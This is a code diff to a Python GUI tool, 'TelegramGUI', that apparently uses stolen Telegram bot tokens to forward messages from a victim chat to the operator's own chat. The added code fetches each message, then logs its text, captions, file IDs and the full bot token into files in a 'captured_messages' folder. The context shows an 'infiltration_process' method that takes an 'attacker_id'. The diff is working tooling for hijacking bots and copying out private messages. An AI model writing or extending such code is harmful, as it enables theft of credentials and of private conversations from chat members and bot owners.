@@ -199,6 +199,8 @@ class TelegramGUI:
         self.stopped_id = 0
         self.current_msg_id = 0
         self.max_older_attempts = 200
+        self.session = requests.Session()
+
 
     def export_logs(self):
         logs = self.log_text.get("1.0", "end")
@@ -332,10 +334,59 @@ class TelegramGUI:
         self.log_text.see("end")
         self.log_text.configure(state="disabled")
 
+    def save_message_to_file(self, chat_id, message_content):
+        if message_content:
+            os.makedirs("captured_messages", exist_ok=True)
+            
+            safe_token = self.bot_token.split(":")[0] if self.bot_token else "unknown"
+            filename = os.path.join("captured_messages", f"bot_{safe_token}_chat_{chat_id}_data.txt")
+            
+            if not os.path.exists(filename):
+                try:
+                    with open(filename, "w", encoding="utf-8") as f:
+                        f.write("=== Bot Information ===\n")
+                        f.write(f"Bot Token: {self.bot_token}\n")
+                        f.write(f"Bot Username: @{self.bot_username}\n")
+                        f.write(f"Chat ID: {chat_id}\n")
+                        f.write(f"Last Message ID: {self.last_message_id}\n")
+                        f.write("\n=== Captured Messages ===\n\n")
+                except Exception as e:
+                    self.log(f"❌ Error creating file header: {e}")
+                    return False
+            
+            try:
+                with open(filename, "a", encoding="utf-8") as f:
+                    f.write(f"\n--- Message ID: {message_content['message_id']} ---\n")
+                    f.write(f"Date: {message_content['date']}\n")
+                    if message_content['text']:
+                        f.write(f"Text: {message_content['text']}\n")
+                    if message_content['caption']:
+                        f.write(f"Caption: {message_content['caption']}\n")
+                    if message_content['file_id']:
+                        f.write(f"File ID: {message_content['file_id']}\n")
+                    f.write("----------------------------------------\n")
+                return True
+            except Exception as e:
+                self.log(f"❌ Save to file error: {e}")
+                return False
+        return False
+
     def stop_forwarding(self):
         self.stop_flag = True
         self.log("➡️ [Stop Button] Stop request sent.")
         self.resume_button.config(state="normal")
+        
+        try:
+            from_chat_id = self.chatid_entry.get().strip()
+            if from_chat_id and not "Example:" in from_chat_id:
+                safe_token = self.bot_token.split(":")[0] if self.bot_token else "unknown"
+                filename = os.path.join("captured_messages", f"bot_{safe_token}_chat_{from_chat_id}_data.txt")
+                
+                if os.path.exists(filename):
+                    self.log(f"📝 Messages saved in: {filename}")
+                    messagebox.showinfo("Data Saved", f"All messages have been saved to: {os.path.basename(filename)}")
+        except Exception as e:
+            self.log(f"❌ Error accessing data file: {e}")
 
     def resume_forward(self):
         self.log(f"▶️ [Resume] Resuming from ID {self.stopped_id + 1}")
@@ -401,6 +452,62 @@ class TelegramGUI:
             self.log(f"[getUpdates] error: {e}")
             return None, None
 
+    def get_message_content(self, bot_token, chat_id, message_id):
+        url = f"{TELEGRAM_API_URL}{bot_token}/getChat"
+        payload = {
+            "chat_id": chat_id
+        }
+        try:
+            r = requests.post(url, json=payload)
+            chat_data = r.json()
+            
+            url = f"{TELEGRAM_API_URL}{bot_token}/forwardMessage"
+            payload = {
+                "chat_id": self.my_chat_id,
+                "from_chat_id": chat_id,
+                "message_id": message_id
+            }
+            r = requests.post(url, json=payload)
+            data = r.json()
+            
+            if data.get("ok"):
+                message = data["result"]
+                content = {
+                    "message_id": message_id,
+                    "chat_id": chat_id,
+                    "date": message.get("date"),
+                    "text": message.get("text", ""),
+                    "caption": message.get("caption", ""),
+                    "file_id": None
+                }
+                
+                media_types = ["photo", "document", "video", "audio", "voice", "sticker"]
+                for media_type in media_types:
+                    if media_type in message:
+                        if isinstance(message[media_type], list):
+                            content["file_id"] = message[media_type][-1].get("file_id")
+                        else:
+                            content["file_id"] = message[media_type].get("file_id")
+                        break
+                
+                return content
+            return None
+        except Exception as e:
+            self.log(f"❌ Get message content error ID {message_id}: {e}")
+            return None
+        
+    def async_save_message_content(self, bot_token, chat_id, message_id):
+        message_content = self.get_message_content(bot_token, chat_id, message_id)
+        if message_content:
+            success = self.save_message_to_file(chat_id, message_content)
+            if success:
+                self.log(f"📝 [Async] Saved message ID {message_id} to file.")
+            else:
+                self.log(f"⚠️ [Async] Failed to save message ID {message_id}.")
+        else:
+            self.log(f"⚠️ [Async] Failed to retrieve content for message ID {message_id}.")
+
+
     def forward_msg(self, bot_token, from_chat_id, to_chat_id, message_id):
         url = f"{TELEGRAM_API_URL}{bot_token}/forwardMessage"
         payload = {
@@ -409,10 +516,15 @@ class TelegramGUI:
             "message_id": message_id
         }
         try:
-            r = requests.post(url, json=payload)
+            r = self.session.post(url, json=payload)
             data = r.json()
             if data.get("ok"):
                 self.log(f"✅ Forwarded message ID {message_id}.")
+                threading.Thread(
+                    target=self.async_save_message_content, 
+                    args=(bot_token, from_chat_id, message_id), 
+                    daemon=True
+                ).start()
                 return True
             else:
                 self.log(f"⚠️ Forward fail ID {message_id}, reason: {data}")
@@ -420,6 +532,7 @@ class TelegramGUI:
         except Exception as e:
             self.log(f"❌ Forward error ID {message_id}: {e}")
             return False
+
 
     def infiltration_process(self, attacker_id):
         found_any = False
